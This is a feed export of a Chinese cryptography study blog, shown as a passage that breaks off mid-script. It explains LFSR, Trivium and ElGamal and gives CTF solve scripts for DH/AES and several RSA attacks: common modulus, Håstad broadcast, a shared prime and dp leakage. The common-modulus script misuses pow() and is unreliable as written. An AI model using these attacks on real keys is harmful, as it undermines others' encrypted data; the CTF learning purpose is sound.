    <content type="html"><![CDATA[<h1 id="lfsr-线性反馈位移器-小结"><a href="#lfsr-线性反馈位移器-小结" class="headerlink" title="lfsr(线性反馈位移器)小结"></a>lfsr(线性反馈位移器)小结</h1><p>lfsr拥有m个触发器和m个可能的反馈位置，系数p<sub>i</sub>即反馈系数，s<sub>i</sub>与p<sub>i</sub>异或后（此处为一一对应异或），得到的一串新的序列，这一串序列再一一异或过去得到新的值也就是s<sub>m</sub>,同时s<sub>0</sub>会被输出，s<sub>m</sub>会接替s<sub>m-1</sub>的位置，整个序列相当于向前移了一个位置。</p><p>（感觉这样说不是很清楚，还是上公式吧）</p><p>s<sub>m</sub> ≡ s<sub>m-1</sub>p<sub>m-1</sub> + … + s<sub>1</sub>p<sub>1</sub> + s<sub>0</sub>p<sub>0</sub> mod 2(s<sub>m</sub> = s<sub>m-1</sub>p<sub>m-1</sub> ⊕ …  ⊕ s<sub>1</sub>p<sub>1</sub> ⊕ s<sub>0</sub>p<sub>0</sub>)</p><p>第m个元素会由此计算得出，第m+1个元素也很容易就可以推导出来：</p><p>s<sub>m+1</sub> ≡ s<sub>m</sub>p<sub>m-1</sub> + … + s<sub>2</sub>p<sub>1</sub> + s<sub>1</sub>p<sub>0</sub> mod 2</p><p>m个触发器中的值会随着时间不断变化，但反馈系数不变，且新的值往往由之前的值决定。通过初始序列计算后来的序列自然是完全可以的，而通过后来的序列推算之前的序列也是可以的（如果知道反馈系数）</p><p>但即便不知道反馈系数，在特定条件下也可以进行攻击。</p><p>针对单个lfsr的已知明文攻击：</p><p>假设有明文x<sub>0</sub>,x<sub>1</sub>,…,x<sub>2m-1</sub>,及其对应密文y<sub>0</sub>,y<sub>1</sub>,…,y<sub>2m-1</sub>。我们便可以构造出初试的2m个序列：</p><p>s<sub>i</sub> ≡ x<sub>i</sub> + y<sub>i</sub> mod 2 ;  i=0,1,…,2m-1。</p><p>当我们拥有了2m个序列时，便可以很轻松地推出密钥k(即p<sub>i</sub>),s<sub>m</sub>由前m-1序列与k分别异或后再逐个异或而来，s<sub>m+1</sub>同理，由此我们可以得到m个方程，未知数也是m个：</p><p>i=0,    s<sub>m</sub> ≡ s<sub>m-1</sub>p<sub>m-1</sub> + … + s<sub>1</sub>p<sub>1</sub> + s<sub>0</sub>p<sub>0</sub>    mod 2</p><p>i=1,    s<sub>m+1</sub> ≡ s<sub>m</sub>p<sub>m-1</sub> + … + s<sub>2</sub>p<sub>1</sub> + s<sub>1</sub>p<sub>0</sub>    mod 2</p><p>…  ,                    ……                                        …</p><p>i=m-1, s<sub>2m-1</sub> ≡ s<sub>2m-2</sub>p<sub>m-1</sub> + … + p<sub>1</sub>s<sub>m</sub> + p<sub>0</sub>s<sub>m-1</sub>    mod2</p><p>就可以解出p<sub>i</sub> 了。</p><p>这样看来lfsr是极易受到攻击的，所以我们往往组合使用。</p><h2 id="Trivium"><a href="#Trivium" class="headerlink" title="Trivium"></a>Trivium</h2><p>将三个位移寄存器结合使用，并借助AND操作提高了安全性。</p><p><img src="https://i.loli.net/2021/04/19/o6bYfH2OFhqTlLA.png" alt="image-20210330213351934.jpg"></p><p>A位移反馈器长度为93，除去正常的位移器运行，69位会作为反馈为影响输入，66位则作为前馈位影响输出，同时91,92位进行AND操作与前馈位一起影响输出，而A的输出会作为B的输入的一部分，B的输出又会作为C的输入，而C的输出又将作为影响A的输入的一部分，而我们得到的密钥序列是A,B,C三个位移器的输出的异或值。</p><p>使用Trivium进行加密：</p><p>1.初始化阶段：将80位的iv加载至A,B最左边，C最右边3位为1，剩余都设置为0.</p><p>2.热身阶段：计时 4*288 = 1152次，并不输出。</p><p>3.加密阶段：至此开始产生的位构成密钥序列。</p><p>（热身阶段是为了充分随机化密码，确保密钥序列同时取决于密钥k和iv）</p>]]></content>
    
    
    <categories>
      
      <category>knowledge-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -LFSR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021hgame_aes_and_DH</title>
    <link href="/2021/03/19/hgame_aes_and_differ-hellman/"/>
    <url>/2021/03/19/hgame_aes_and_differ-hellman/</url>
    
    <content type="html"><![CDATA[<p>出现了g**a mod p和g**b mod p,可以猜到是</p><p>Differ-Hellman密钥交换，</p><p>即真正的密钥是g**ab mod p,但因为a,b未知，所以要把a,b求出</p><p>正常情况下是要求离散对数的，但因为对话中有提示是在加法群下操作的，</p><p>而在加法群中，幂即重复调用改群的运算，即g**a mod p是a*g mod p</p><p>又因为A = a*g mod p所以a=A*g<sup>-1</sup> mod p(g<sup>-1</sup>是g对p的逆元)，同理可以得到b的值，从而得到密钥的值。</p><p>之后直接解AES即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex<br>A = <span class="hljs-number">6407001517522031755461029087358686699246016691953286745456203144289666065160284103094131027888246726980488732095429549592118968601737506427099198442788626223019135982124788211819831979642738635150279126917220901861977041911299607913392143290015904211117118451848822390856596017775995010697100627886929406512483565105588306151304249791558742229557096175320767054998573953728418896571838697779621641522372719890056962681223595931519174265357487072296679757688238385898442549594049002467756836225770565740860731932911280385359763772064721179733418453824127593878917184915316616399071722555609838785743384947882543058635</span><br>B = <span class="hljs-number">5522084830673448802472379641008428434072040852768290130448235845195771339187395942646105104638930576247008845820145438300060808178610210847444428530002142556272450436372497461222761977462182452947513887074829637667167313239798703720635138224358712513217604569884276513251617003838008296082768599917178457307640326380587295666291524388123169244965414927588882003753247085026455845320527874258783530744522455308596065597902210653744845305271468086224187208396213207085588031362747352905905343508092625379341493584570041786625506585600322965052668481899375651376670219908567608009443985857358126335247278232020255467723</span><br>p = <span class="hljs-number">30567260905179651419358486099834315837354102714690253338851161207042846254351374572818884286661092938876675032728700590336029243619773064402923830209873155153338320502164587381848849791304214084993139233581072431814555885408821184652544361671134564827265516331283076223247829980225591857643487356406284913560960657053777612115591241983729716542192518684003840806442329098770424504275465756739925434019460351138273272559738332984560095465809481270198689251655392941966835733947437503158486731906649716026200661065054914445245468517406404904444261196826370252359102324767986314473183183059212009545789665906197844518119</span><br>g = <span class="hljs-number">12602983924735419868428783329859102652072837431735895060811258460532600319539509800915989811879506790207025505003183121812480524033163157114086741486989697</span><br>x1 = gp.invert(g,p)*A%p<br>x2 = gp.invert(g,p)*B%p<br>key1 = x1*x2*g%p<br>shared_secret = key1<br>sha1 = hashlib.sha1()<br>sha1.update(<span class="hljs-built_in">str</span>(shared_secret).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>key = sha1.digest()[:<span class="hljs-number">16</span>]<br>iv1 = a2b_hex(<span class="hljs-string">&#x27;d3811beb5cd2a4e1e778207ab541082b&#x27;</span>)<br>iv2= a2b_hex(<span class="hljs-string">&#x27;b4259ed79d050dabc7eab0c77590a6d0&#x27;</span>)<br>data1 = a2b_hex(<span class="hljs-string">&#x27;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092&#x27;</span>)<br>data2 = a2b_hex(<span class="hljs-string">&#x27;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89&#x27;</span>)<br>decrypt1 = AES.new(key,AES.MODE_CBC,iv1)<br>decrypt2 = AES.new(key,AES.MODE_CBC,iv2)<br>flag1 = decrypt1.decrypt(data1)<br>flag2 = decrypt2.decrypt(data2)<br>print(flag1,flag2)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -ctf -DH -aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rsa初期</title>
    <link href="/2021/03/19/RSA%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%EF%BC%88%E5%88%9D%E6%9C%9F%EF%BC%89/"/>
    <url>/2021/03/19/RSA%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%EF%BC%88%E5%88%9D%E6%9C%9F%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RSA常见题型"><a href="#RSA常见题型" class="headerlink" title="RSA常见题型"></a>RSA常见题型</h1><h2 id="一、普通解密-给出e-c，且已知p-q或较易分解的n"><a href="#一、普通解密-给出e-c，且已知p-q或较易分解的n" class="headerlink" title="一、普通解密(给出e,c，且已知p,q或较易分解的n)"></a><strong>一、普通解密(给出e,c，且已知p,q或较易分解的n)</strong></h2><p>可以直接根据RSA的基本原理写出脚本，对于较易分解的n可以使用factor网站在线质因数分解，也可以使用yafu工具进行分解。</p><p>基本解密过程：</p><p>phi(n)=(p-1)*(q-1) #计算欧拉函数</p><p>ed≡1 mod phi(n) #通过该表达式求密钥d</p><p>c**d≡m mod n #最后求得明文m</p><p>注意：计算出的m是一串数字，要得到真正意义上的明文，还得将其转化成字符。（不排除某些题目直接以m作为明文。）</p><h2 id="二、给出了n-p-q-dp-dq-c但未给出e"><a href="#二、给出了n-p-q-dp-dq-c但未给出e" class="headerlink" title="二、给出了n,p,q,dp,dq,c但未给出e"></a><strong>二、给出了n,p,q,dp,dq,c但未给出e</strong></h2><p>由于没有e我无法直接利用原理解出d，而使用中国剩余定理会因为p-1和q-1不互质而受到阻碍。</p><p>自己就推导了一个公式（因为看不懂别人写的解法）：</p><p>c**dp≡m mod p</p><p>(dp换成dq也是可以的，但对应的p就要换成q）</p><p>推导过程如下：</p><p>dp≡d mod p-1</p><p>d=dp+k*(p-1)#k为整数</p><p>c**d=c**(dp+k*(p-1))</p><p>c**d≡m mod n   </p><p>c**(dp+k*(p-1))≡m mod n</p><p>n=p*q</p><p>c**(dp+k*(p-1))≡m mod p</p><p>由费马小定理：a**(p-1)≡1 mod p</p><p>c**(p-1)≡1 mod p</p><p>c**k(p-1)≡1 mod p#k为整数时可由二项式定理证得，而当k为负数时，计算要先取逆元再-k次方，仍然可证。</p><p>c**dp≡m mod p</p><h2 id="三、-共模攻击（给出一个n和多组e-c）"><a href="#三、-共模攻击（给出一个n和多组e-c）" class="headerlink" title="三、 共模攻击（给出一个n和多组e,c）"></a><strong>三、 共模攻击（给出一个n和多组e,c）</strong></h2><p>寻找一组互质的e1,e2,再由欧几里得扩展算法可得：</p><p>e1*s1+e2*s2 = 1</p><p>之后想方设法拼凑表达式利用该条件</p><p>c1 = m**e1 mod n </p><p>c2 = m**e2 mod n</p><p>(c1**s1*c2**s2) mod n = ((m**e1 mod n)**s1*(m**e2 mod n)**s2)%n</p><p>(c1**s1*c2**s2) mod n = ((m**e1)**s1*(m**e2)**s2) mod n</p><p>(c1**s1*c2**s2) mod n = (m**(e1*s1+e2*s2)) mod n</p><p>c1**s1*c2**s2≡ m mod n </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入n： &quot;</span>))<br>e1=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入e1: &quot;</span>))<br>c1=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入c1: &quot;</span>))<br>e2=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入e2: &quot;</span>))<br>c2=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入c2: &quot;</span>))<br>s=gp.gcdext(e1,e2)<br>s1=s[<span class="hljs-number">1</span>]<br>s2=s[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1=-s1<br>    c1r=gp.invert(c1,n)<br>    m=<span class="hljs-built_in">pow</span>(c1r**s1*c2**s2,n)<br><span class="hljs-keyword">else</span>:<br>    s2=-s2<br>    c2r=gp.invert(c2,n)<br>    m=<span class="hljs-built_in">pow</span>(c1**s1*c2r**s2,n)<br>print(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h2 id="四、-给出pem-enc-文件（或者其他将flag和解密信息放在文件中的题目）"><a href="#四、-给出pem-enc-文件（或者其他将flag和解密信息放在文件中的题目）" class="headerlink" title="四、 给出pem,enc 文件（或者其他将flag和解密信息放在文件中的题目）"></a><strong>四、 给出pem,enc 文件（或者其他将flag和解密信息放在文件中的题目）</strong></h2><p>1.</p><p>使用openssl工具（这个Linux自带）使用命令:</p><p><strong>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</strong></p><p>得到n,e,此时利用工具对n进行分解得到p,q。</p><p>再用 rsatool 生成私钥文件: private.pem <strong>python rsatool.py -o private.pem -e 65537 -p XXXXX -q XXXX</strong></p><p>最后用 private.pem 解密 flag.enc <strong>openssl rsautl -decrypt -in flag.enc -inkey private.pem</strong></p><p>可以得到答案。</p><p>2.</p><p>查看公钥文件也可以直接使用Python的一些库来完成操作。</p><p><code>from Crypto.PublicKey import RSA</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pub1=RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./publickey1.pem&#x27;</span>).read())<br>n1= pub1.n<br>e1= pub1.e<br></code></pre></td></tr></table></figure><p>该操作可以直接读取公钥文件中的数据。</p><p>之后就是正常解密流程，得到，p,q,d。</p><p><code>import rsa</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">privatekey = rsa.PrivateKey(n,e,d,p,q)<br><span class="hljs-built_in">str</span>=f.read()<br>print(rsa.decrypt(<span class="hljs-built_in">str</span>,privatekey).decode())<br></code></pre></td></tr></table></figure><p>直接得到Privatekey,并志杰用其解密flag所在的文件，输出flag。</p><h2 id="五、-多组n-c，求m（低指数广播攻击）"><a href="#五、-多组n-c，求m（低指数广播攻击）" class="headerlink" title="五、  多组n,c，求m（低指数广播攻击）"></a><strong>五、  多组n,c，求m（低指数广播攻击）</strong></h2><p>对于多组，n,c,且已知e或e较小的情况。</p><p>利用中国剩余定理可以直接解出m**e,然后直接开根解得m。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>n1=<span class="hljs-number">0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941</span><br>c1=<span class="hljs-number">0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877db</span><br>n2=<span class="hljs-number">0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebff</span><br>c2=<span class="hljs-number">0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872</span><br>n3=<span class="hljs-number">0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249</span><br>c3=<span class="hljs-number">0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467</span><br>n1=<span class="hljs-built_in">int</span>(n1)<br>c1=<span class="hljs-built_in">int</span>(c1)<br>n2=<span class="hljs-built_in">int</span>(n2)<br>c2=<span class="hljs-built_in">int</span>(c2)<br>n3=<span class="hljs-built_in">int</span>(n3)<br>c3=<span class="hljs-built_in">int</span>(c3)<br>t1=gp.invert(n2*n3,n1)<br>t2=gp.invert(n1*n3,n2)<br>t3=gp.invert(n1*n2,n3)<br>weim=(c1*t1*n2*n3+c2*t2*n1*n3+c3*t3*n1*n2)%(n1*n2*n3)<br>m=gp.iroot(weim,<span class="hljs-number">3</span>)<br>print(m)<span class="hljs-comment">#这里先把m打印出来，可以得到类似mpz(....)这种数据，括号内就是所需的m数值，但这个带括号的数据不能直接使用long_to_bytes转化，所以这里先把m打出来然后直接复制到下面的函数里转化。</span><br>print(long_to_bytes(<span class="hljs-number">11667486319353623306221917311659938391432552876667393571592853766459303917362695551586161498975732393341</span>))<br></code></pre></td></tr></table></figure><p>但是如果已知e，也是可以直接爆破的，因为c≡m** e mod n,可以推出m**e=c+k *n,且一般k会大于零，因为根据rsa原理，我们是由m**e%n直接得到c，（因为如果c大于n，会有无数个解），所以可以直接把可能的k值带进去得到答案。</p><h2 id="六、给出n-e-dp-c的题目。"><a href="#六、给出n-e-dp-c的题目。" class="headerlink" title="六、给出n,e,dp,c的题目。"></a><strong>六、给出n,e,dp,c的题目。</strong></h2><p>d=dp+k1*(p-1)</p><p>de=1+k2*(p-1)*(q-1)</p><p>将这两个式子结合得：</p><p>e*dp+e*k1*(p-1)=k2*(p-1)+1</p><p>再将这个式子两边对（p-1）同时取余可得：</p><p>e*dp☰1 mod p-1</p><p>即：</p><p>e*dp=k*(p-1)+1</p><p>又因为dp&lt;p-1,k*(p-1)&lt;e*dp</p><p>所以e&gt;k;</p><p>接下来利用该表达式对k进行遍历就可以了，遍历范围(0,e)。</p>]]></content>
    
    
    <categories>
      
      <category>ctf-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -ctf -rsa -aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ElGamal</title>
    <link href="/2021/03/19/ElGamal/"/>
    <url>/2021/03/19/ElGamal/</url>
    
    <content type="html"><![CDATA[<h1 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h1><h2 id="ElGamal算法"><a href="#ElGamal算法" class="headerlink" title="ElGamal算法"></a>ElGamal算法</h2><p>此时有一个需被加密的消息x。</p><p><strong>密钥生成：</strong></p><p>随机取一个大素数p，并取Z<sub>p</sub><sup>*</sup>的一个本原元作为α，再从{2,…,p-2}中随机取一个数作为d,计算β ≡ α<sup>d</sup> mod p 。({d}为私钥，{p,α,β}为公钥。)</p><p><strong>加密：</strong></p><p>再次从{2,…p-2}中随机取一个数作为r,计算k<sub>r</sub>≡α<sup>r</sup> mod p。计算k<sub>m</sub>≡β<sup>r</sup> mod p。</p><p>计算y≡k<sub>m</sub>*x mod p，y就是加密出的密文。</p><p><strong>解密：</strong></p><p>计算x≡（k<sub>r</sub><sup>d</sup> )<sup>-1</sup>*y mod p 得出x。</p><h2 id="ElGamal协议"><a href="#ElGamal协议" class="headerlink" title="ElGamal协议"></a>ElGamal协议</h2><p>ElGamal协议是对ElGamal方案的正式定义。</p><p>为了方便描述，我们先假设有Alice和Bob这两个人。</p><p>为了保证消息的私密性，二人决定对传递的消息加密。</p><p>首先，Bob随机取一个大素数p，并取Z<sub>p</sub><sup>*</sup>的一个本原元作为α，在从{2,…,p-2}中随机取一个数字作为d,并计算β≡α<sup>d</sup> mod p。</p><p>Bob将p和α对外公开，并将（p,α,β）作为公钥k<sub>pub</sub>发送给Alice。</p><p>Alice从{2,…,p-2}中选择一个数作为r,计算k<sub>r</sub> ≡ α<sup>r</sup> mod p。计算k<sub>m</sub> ≡ β<sup>r</sup> mod p。</p><p>并将消息x（x的长度必须小于p）通过y≡x*k<sub>m</sub> mod p加密成y。最后，Alice将(k<sub>r</sub>,y)发送给Bob。</p><p>Bob通过k<sub>m</sub> ≡ k<sub>r</sub><sup>d</sup> mod p 计算出掩码密钥k<sub>m</sub>，而后再通过计算x ≡ y*k<sup>-1</sup> mod p得到x。</p><h2 id="ElGamal协议的验证"><a href="#ElGamal协议的验证" class="headerlink" title="ElGamal协议的验证"></a>ElGamal协议的验证</h2><p>Alice需加密的消息为x=11。</p><p>Bob生成一个素数P=13，取α=2。选择d=8，则可以计算出β=9。而后Bob将（p,α,β）作为k<sub>pub</sub>发送给Alice。</p><p>Alice选择r=5,计算出k<sub>r</sub>=α<sup>r</sup> ≡ 6 mod 13,再计算出k<sub>m</sub>=β<sup>r</sup> ≡ 3 mod 13,再对消息x进行加密，计算y=x*k<sub>m</sub> ≡ 7 mod 13。而后再将（k<sub>r</sub> , y)发送给Bob。</p><p>Bob通过k<sub>m</sub>=k<sub>r</sub><sup>d</sup> ≡ 3 mod 13,得到了k<sub>m</sub>，最后只要计算x=y*k<sub>m</sub><sup>-1</sup> ≡ 11 mod 13，便成功还原出了消息x。</p><h2 id="ElGamal加密和解密的代码的简单实现"><a href="#ElGamal加密和解密的代码的简单实现" class="headerlink" title="ElGamal加密和解密的代码的简单实现"></a>ElGamal加密和解密的代码的简单实现</h2><p>这里我直接将加密和解密的代码写在一起，方便验证其正确性。代码中的P是提前生成的大素数，af是Z<sub>p</sub><sup>*</sup>的一个本原元。（代码是用Python写的。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>x=bytes_to_long(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input:&quot;</span>),encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br>p=<span class="hljs-number">25123340539613169448341086263083665422339746291241104014172083032815449631995806048303663356814273919781597336198663028438720363603452541021888997965977983</span><br>af=<span class="hljs-number">2</span><br>d=<span class="hljs-number">5</span><span class="hljs-comment">#从零到p-2中取随机取一个数，这里直接取5</span><br>b=<span class="hljs-built_in">pow</span>(af,d,p)<br>r=<span class="hljs-number">67</span><span class="hljs-comment">#从零到p-2中随机去一个数，这里取67</span><br>km=b**r%p<span class="hljs-comment">#计算加密的密钥</span><br>y=km*x%p<span class="hljs-comment">#得出密文</span><br>print(<span class="hljs-string">&quot;密文为：&quot;</span>,y)<br><span class="hljs-comment">#*************</span><br><span class="hljs-comment">#下面这部分是解密代码</span><br><span class="hljs-comment">#*************</span><br>kr=<span class="hljs-built_in">pow</span>(af,r,p)<span class="hljs-comment">#这里才计算kr是因为只有解密时才需要kr</span><br>km=<span class="hljs-built_in">pow</span>(kr,d,p)<span class="hljs-comment">#计算解密所需密钥</span><br>k=gp.invert(km,p)<span class="hljs-comment">#计算解密的密钥的逆元</span><br>dx=y*k%p<br>print(<span class="hljs-string">&quot;明文为：&quot;</span>,long_to_bytes(dx))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -ElGaml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020BJDasa</title>
    <link href="/2021/03/19/asa/"/>
    <url>/2021/03/19/asa/</url>
    
    <content type="html"><![CDATA[<h1 id="2020BJDasa"><a href="#2020BJDasa" class="headerlink" title="2020BJDasa"></a>2020BJDasa</h1><p>可以发现两个n公用了一个p,那么求取两个n的最大公因数就可以得到p,这样一来两个n就都可以被分解了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>n1=<span class="hljs-number">0x661d752110bcc6ee5ca33edaf244716cccce6400dfdbfd84ce6ae2d8fbbeb2f61584da7668768403b6135e7810eae9d4d8e044935f8680de5324c3fc0f9bffb01812f9d2ac9055ee8dbd17b90c5a60cb7595a82f24a075d951db3b7f913b8543ecd52b8c8464ce348c3970d511ae911e814f9ca33b8412db2730e61820f5de47</span><br>p=<span class="hljs-number">9540203717217880059997385799331301649727503984010337568404427747385824530958536656147747848448822264268428226235860927158082497191830274046098671199542207</span><br>c1=<span class="hljs-number">0xd7931796fa39cfa37c0b621c01175904206dff1d74a28369dcd6517957ed76c5eb7d4934cbeb902119f9215f9ae7926debe3abe856244b45dbb4caaa2b93dbb79a3ca1a9813e1466c49fe3c03e5462811afbf3f40ff79927f9fe3681b7f3cef34466b9a736512f4931b5026eefacbae9be6e408085a7a636c514574c3b22ffe</span><br>q=n1//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">65537</span><br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c1,d,n1)<br>print(long_to_bytes(m))<br><span class="hljs-comment">#key=b&#x27;\x89)\xef\x12\xa1\x7f\x14[\xc9\xb4\x8a\xfa,\x88\xa2\xef&#x27;</span><br></code></pre></td></tr></table></figure><p>同理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>p=<span class="hljs-number">9540203717217880059997385799331301649727503984010337568404427747385824530958536656147747848448822264268428226235860927158082497191830274046098671199542207</span><br>n2=<span class="hljs-number">0x9f159326c907441326c88d17eae1c6e8aaea23922c5e628a585294e379e9245644f9c249c57f54a2b83921b4adc988fecc90c00feb6936d9be1f3a5ffae951b74ffbc6fc7aa11743e4ca179a937392dacf931e820d1d83016562ff608e8c59ef7310654a09bbba4a0129f71dcb61bd9bef073bbb93bfcac4a7a2e81156dbb32d</span><br>c2=<span 